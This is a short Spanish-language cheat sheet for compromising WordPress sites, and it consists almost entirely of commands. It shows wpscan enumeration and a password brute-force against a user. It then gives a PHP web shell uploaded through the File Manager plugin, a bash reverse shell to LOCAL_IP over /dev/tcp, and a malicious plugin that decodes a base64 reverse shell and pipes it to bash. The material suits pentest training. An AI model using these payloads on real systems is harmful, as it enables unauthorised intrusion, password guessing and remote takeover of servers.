## Escanear login.php

```bash
wpscan —url URL —enumerate u,vp,vt,tt,cb,dbe —plugins-detection agressive
```

## Ataque de fuerza bruta a usuario

```bash
wpscan —url “URL” -U USER  -P DICCIONARIO 
```

## Enumeración de plugins:

```bash
curl -s -X -GET URL | grep “plugin”

searchsploit plugin

searchsploit -x PATH
```
## Rev shell con File Manager:

En plugins instalar File manager 

agregar un archivo cmd.php:

```bash
<?php

system($_GET[”cmd”]);

?>
```

Ejecutar desde URL:

```bash
http://URL/wp-content/uploads/cmd.php?cmd=bash -c 'exec bash -i %26>/dev/tcp/LOCAL_IP/PORT <%261'
```

## Rev Shell subiendo un plugin:

Encriptar la shell :

```bash
echo "bash -c '/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'" | base64
```

```bash
nano plugin.php

#Dentro del nano
<?php
/*
Plugin Name: HACKEADO
Description: Plugin para ejecutar comandos del sistema a través de la URL (solo en entorno controlado).
Version: 66666666.0
Author: d1se0
*/
?>

<?php
system("echo 'Base64ReverShell' | tee /tmp/shell; base64 -d /tmp/shell | bash");
?>
```

Desde el host :

```bash
zip plugin.zip plugin.php
```

En Wordpress :

```bash
Plugins -> Añadir nuevo plugin -> Subir Plugin
```
